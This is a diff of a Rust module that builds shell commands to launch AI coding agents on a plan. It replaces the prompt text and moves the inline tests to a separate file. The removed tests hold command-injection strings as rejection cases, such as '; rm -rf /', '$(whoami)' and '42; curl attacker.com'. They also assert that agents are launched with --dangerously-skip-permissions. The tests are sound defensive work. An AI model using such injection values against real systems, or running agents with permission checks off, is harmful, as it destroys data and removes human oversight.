@@ -69,8 +69,14 @@ pub(super) fn build_agent_command(
     }
 
     let dir = "~/GitHub/ConvergioPlatform";
-    // Build the prompt string incrementally — never interpolate raw user input into format!
-    let mut prompt = format!("Execute plan {plan_id}");
+    // Build the prompt with cvg workflow instructions (matches delegation_core)
+    let mut prompt = format!(
+        "Execute plan {plan_id}. Per task: \
+         cvg task update <id> in_progress → work → cvg task update <id> submitted. \
+         Run ALL verify[] commands before submitting. \
+         After each wave: cvg plan validate {plan_id}. \
+         After all waves: cvg plan complete {plan_id}"
+    );
     if !task_id.is_empty() {
         prompt.push_str(&format!(" task {task_id}"));
     }
@@ -125,136 +131,5 @@ pub(super) fn update_task_status(state: &ServerState, qs: &HashMap<String, Strin
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn safe_id_valid_and_invalid() {
-        assert!(is_safe_id("T1-02"));
-        assert!(is_safe_id("671"));
-        assert!(is_safe_id("plan_706"));
-        assert!(!is_safe_id(""));
-        for bad in &[
-            "; rm -rf /",
-            "$(whoami)",
-            "`id`",
-            "foo && bar",
-            "foo | bar",
-            "foo > /tmp/x",
-            "foo\nbar",
-            "foo'bar",
-            "foo\"bar",
-            "foo bar",
-        ] {
-            assert!(!is_safe_id(bad), "expected rejection of: {bad}");
-        }
-    }
-
-    #[test]
-    fn valid_cli_claude_builds_command() {
-        let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
-        assert!(cmd.contains("claude --dangerously-skip-permissions"));
-        assert!(cmd.contains("Execute plan 671"));
-        assert!(!cmd.contains("task "));
-        assert!(!cmd.contains("wave "));
-
-        let mut qs = HashMap::new();
-        qs.insert("task_id".into(), "T1-02".into());
-        qs.insert("wave_id".into(), "W1".into());
-        let cmd = build_agent_command("claude", "671", &qs).unwrap();
-        assert!(cmd.contains("Execute plan 671 task T1-02 wave W1"));
-    }
-
-    #[test]
-    fn valid_cli_copilot_builds_command() {
-        let mut qs = HashMap::new();
-        qs.insert("task_id".into(), "99".into());
-        let cmd = build_agent_command("copilot", "42", &qs).unwrap();
-        assert!(cmd.contains("copilot") && !cmd.contains("--dangerously-skip-permissions"));
-    }
-
-    #[test]
-    fn invalid_cli_and_injection_rejected() {
-        let msg = build_agent_command("my-agent", "42", &HashMap::new())
-            .unwrap_err()
-            .to_string();
-        assert!(msg.contains("not in the allowed list"), "got: {msg}");
-        assert!(build_agent_command("claude; rm -rf /", "42", &HashMap::new()).is_err());
-    }
-
-    #[test]
-    fn plan_id_injection_rejected() {
-        let msg = build_agent_command("claude", "42; curl attacker.com", &HashMap::new())
-            .unwrap_err()
-            .to_string();
-        assert!(msg.contains("plan_id"), "got: {msg}");
-        assert!(build_agent_command("claude", "`whoami`", &HashMap::new()).is_err());
-    }
-
-    #[test]
-    fn task_wave_id_injection_rejected() {
-        let mut qs = HashMap::new();
-        qs.insert("task_id".into(), "T1-02 && evil".into());
-        let msg = build_agent_command("claude", "671", &qs)
-            .unwrap_err()
-            .to_string();
-        assert!(msg.contains("task_id"), "got: {msg}");
-
-        let mut qs2 = HashMap::new();
-        qs2.insert("wave_id".into(), "W1$(id)".into());
-        let msg2 = build_agent_command("claude", "671", &qs2)
-            .unwrap_err()
-            .to_string();
-        assert!(msg2.contains("wave_id"), "got: {msg2}");
-    }
-
-    #[test]
-    fn command_uses_hardcoded_binary() {
-        let cmd = build_agent_command("claude", "1", &HashMap::new()).unwrap();
-        assert!(cmd.contains("claude --dangerously-skip-permissions"));
-    }
-
-    // TDD: file-based prompt delivery — verify --input-file is used, not -p with inline prompt.
-    // Special chars (quotes, backticks, $vars, newlines) must survive in the file path, not shell.
-    #[test]
-    fn claude_uses_input_file_not_inline_prompt() {
-        let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
-        // Must use --input-file for prompt delivery
-        assert!(
-            cmd.contains("--input-file"),
-            "expected --input-file in command, got: {cmd}"
-        );
-        // Must NOT pass prompt inline via -p flag (breaks on special chars)
-        assert!(
-            !cmd.contains(" -p "),
-            "must not use inline -p flag, got: {cmd}"
-        );
-    }
-
-    #[test]
-    fn copilot_uses_input_file_not_inline_prompt() {
-        let cmd = build_agent_command("copilot", "42", &HashMap::new()).unwrap();
-        assert!(
-            cmd.contains("--input-file"),
-            "expected --input-file in command, got: {cmd}"
-        );
-    }
-
-    #[test]
-    fn prompt_file_written_before_agent_invocation() {
-        // The command must first write the prompt to a temp file, then invoke the agent.
-        // Order: write step appears before agent invocation in the command string.
-        let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
-        let write_pos = cmd.find("printf").or_else(|| cmd.find("cat >")).or_else(|| cmd.find("tee"));
-        let agent_pos = cmd.find("claude --dangerously");
-        assert!(write_pos.is_some(), "command must write prompt to file, got: {cmd}");
-        assert!(write_pos.unwrap() < agent_pos.unwrap(), "prompt write must precede agent invocation");
-    }
-
-    #[test]
-    fn prompt_file_path_uses_plan_id() {
-        // The temp file path should include plan_id for uniqueness and traceability.
-        let cmd = build_agent_command("claude", "671", &HashMap::new()).unwrap();
-        assert!(cmd.contains("671"), "prompt file path should include plan_id for traceability");
-    }
-}
+#[path = "sse_delegate_util_tests.rs"]
+mod tests;
